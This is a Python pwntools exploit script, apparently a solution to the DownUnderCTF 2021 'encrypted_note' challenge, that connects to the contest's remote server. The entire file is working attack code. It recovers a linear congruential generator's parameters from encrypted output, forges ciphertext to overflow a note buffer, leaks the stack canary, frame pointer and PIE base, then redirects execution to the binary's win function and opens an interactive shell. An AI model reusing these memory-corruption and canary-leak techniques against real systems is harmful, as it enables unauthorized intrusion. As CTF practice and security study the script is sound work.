#!/usr/bin/python3
from pwn import *
from binascii import hexlify, unhexlify
import gmpy


def write(note):
    io.sendlineafter(b'> ', b'1')
    io.sendafter(b'Enter note contents: ', note)


def read():
    io.sendlineafter(b'> ', b'2')


def append(data):
    io.sendlineafter(b'> ', b'3')
    io.sendafter(b'Enter note contents to append: ', p64(data))


def reverse(str):
    first = int(b'0x'+str.strip(), 0)
    tmp = first
    final = 0
    for i in range(8):
        final = final << 8
        final += tmp & 0xff
        tmp = tmp >> 8
    return final


def get_a(m, seq):
    k = (seq[0] - seq[1]) % m
    inv = int(gmpy.invert(k, m))
    return (inv * (seq[1] - seq[2])) % m


def get_b(m, a, seq):
    return (seq[1] - seq[0]*a) % m


if __name__ == '__main__':
    #io = process('./encrypted_note')
    io = remote('pwn-2021.duc.tf', 31908)
    exe = ELF('./encrypted_note')
    write(b"A"*0x18)
    read()
    x_seq = io.recvline().strip()
    x1 = reverse(x_seq[0:16]) ^ 0x4141414141414141
    x2 = reverse(x_seq[16:16*2]) ^ 0x4141414141414141
    x = reverse(x_seq[16*2:16*3]) ^ 0x4141414141414141

    seq = [x1, x2, x]
    a = get_a(2**64, seq)
    b = get_b(2**64, a, seq)

    print(f'A = {hex(a)}')
    print(f'B = {hex(b)}')

    def set_next():
        global x
        x = (b + (a * x)) % 2**64
        return x

    def set_data(data):
        req = b''
        for each in data:
            req += p64(set_next() ^ each)
        return req
    data = [
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x0041414141410041
    ]
    write(set_data(data))
    append(set_next() ^ 0xffffffffffffffff)
    read()
    io.recvuntil(b'ffffffffffffff')
    canary = (reverse(io.recvn(16)) >> 8) << 8
    print(f'Canary = {hex(canary)}')
    rbp = (reverse(io.recvn(12))) >> 16
    print(f'RBP = {hex(rbp)}')
    data = [
        0x4141414141414142,
        0x4141414141414142,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414142,
        0x4141414141414142,
        0x0041414141414141
    ]
    write(set_data(data))
    append(set_next() ^ 0x004242424242ff)
    append(set_next() ^ 0xffffffff)
    append(set_next() ^ 0x4343434343434343)
    read()
    io.recvuntil(b'43434343434343')
    pie_leak = rbp = ((reverse(io.recvn(12))) >> 16) & 0xfffffffffffff000
    pie_base = pie_leak - 0x1000
    print(f'Pie base: {hex(pie_base)}')

    write(set_data(data))
    append(set_next() ^ 0x004242424242ff)
    append(set_next() ^ 0x00ffffffffffff)
    append(set_next() ^ 0x00db4141414141)
    append(set_next() ^ ((pie_base + exe.sym.win) >> 8))
    data = [
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x0041004141414141
    ]
    write(set_data(data))
    append(set_next() ^ 0xff41414100ff4242)
    append(set_next() ^ (((canary & 0xffffffffffff) >> 8) << 8)+0x41)
    append(set_next() ^ canary >> 48)
    data = [
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x4141414141414141,
        0x0041414141004141
    ]
    canary_least = (canary & 0xffff) >> 8
    print('start')
    for i in range(1):
        write(set_data(data))
        navy = ((set_next() ^ 0x0000414141414241))  # >> 8) << 8
        append(navy)

    io.sendlineafter(b'> ', b'0')
    io.interactive()
